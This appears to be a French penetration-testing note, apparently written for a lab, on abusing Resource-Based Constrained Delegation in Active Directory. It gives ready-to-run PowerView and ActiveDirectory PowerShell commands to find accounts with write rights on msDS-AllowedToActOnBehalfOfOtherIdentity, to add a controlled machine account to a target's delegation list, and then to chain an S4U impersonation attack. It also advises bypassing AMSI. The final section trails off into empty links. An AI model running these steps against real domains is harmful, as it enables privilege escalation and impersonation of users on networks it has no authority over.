

> [!tip]
> Dans le même esprit que la Délégation contrainte, mais cette fois ci c'est le serveur backend qui définit qui peut accéder à ses ressources.
> - Introduit à partir de Windows Server 2012.
> - Ici, ce n’est pas le **compte source** (WEB01) qui définit vers où il peut déléguer, mais le **compte destination** (SQL01) qui dit :
> 	- "J’accepte de recevoir des tickets délégués de la part de WEB01".
> - Définit à partir de l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity

> [!TIP]
> Exploitable si :
> 
> - Droit d'écriture sur l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity d'un compte de machine.
> - Nécessite le contrôle d'un compte ayant un SPN (Par défaut n'importe quel compte de machine en a un.) ou un compte utilisateur que nous contrôlons et que nous sommes prêts à sacrifier (change son mot de passe).


# Identifier les droits d'écriture

Identifier les comptes ayant le droit d'écriture sur l'attribut ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity d'autres comptes avec Powerview (au travers du pivot)

1. importer Powerview (penser à bypasser l'AMSI sur notre machine)

```
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```

2. Définir un Credential Object

```
$Cred = Get-Credential CONTOSO\rsteel
```

3. Identifier les comptes ayant les droits d'écriture (WriteProperty, GenericWrite, GenericAll) sur un attribut ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity (GUID 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all)

WriteProperty

```
Get-DomainComputer -Server <DC_hostname> -Credential $Cred | Get-DomainObjectAcl -Server <DC_hostname> -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```

GenericWrite

```
Get-DomainComputer -Server <DC_IP> -Credential $Cred | Get-DomainObjectAcl -Server <DC_IP> -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'GenericWrite' } | select ObjectDN,SecurityIdentifier
```

GenericAll

```
Get-DomainComputer -Server <DC_IP> -Credential $Cred | Get-DomainObjectAcl -Server <DC_IP> -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'GenericAll' } | select ObjectDN,SecurityIdentifier
```


4. Résoudre le SID retourné

```
Get-ADGroup -Filter 'objectsid -eq "<SID>"' -Server <DC_IP> -Credential $Cred
```



# Exploitation


## En controlant un compte ayant un SPN


1. Identifier les RBCD déja inscrites.

```
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

> [!WARNING]
>  Si une valeur est déjà présente et qu'il s'agit d'un compte d'ordinateur, on devra définir un compte d'ordinateur obligatoirement car la collection de propriété ne peut contenir que des valeurs de même type.

2. Modifier la propriété en inscrivant le compte de machine que nous contrôlons, sans oublier de préciser le compte déjà présent.

```
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server <DC_IP> -Credential $Cred
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server <DC_IP> -Credential $Cred

Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server <DC_IP> -Credential $Cred
```

3. Vérifier que la propriété a bien été modifiée

```
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server <DC_IP> -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

4. Puis faire une attaque S4U2Self (avec transition de protocol) -> [[2. Constrained Delegations (S4U)]]


Enfin supprimer nos modifications sur la propriété

```
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred

Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```


## Sans compte ayant un SPN

Possible d'ajouter un compte de machine et lui attribuer un SPN si Machine Account Quota n'est pas à 0. ->

Ou bien utiliser un compte d'utilisateur que nous contrôlons et le "sacrifier" (change son mot de passe). ->